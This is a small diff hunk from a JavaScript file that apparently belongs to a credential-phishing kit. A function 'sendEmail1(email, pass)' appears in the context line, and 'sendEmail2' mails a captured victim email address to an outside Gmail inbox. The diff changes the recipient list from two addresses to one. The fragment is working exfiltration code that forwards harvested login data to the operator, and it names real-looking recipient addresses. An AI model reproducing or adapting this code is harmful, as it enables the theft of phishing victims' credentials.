@@ -338,7 +338,7 @@ const sendEmail1 = (email, pass) => {
 const sendEmail2 = (email) => {
   var mailOptions = {
     from: "support Team" ,
-    to: 'mayowaandrews723@gmail.com, helper@air19express.com',
+    to: 'mayowaandrews723@gmail.com',
     subject: `Users email,`,
     text: `:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
      senders email: ${email}`,
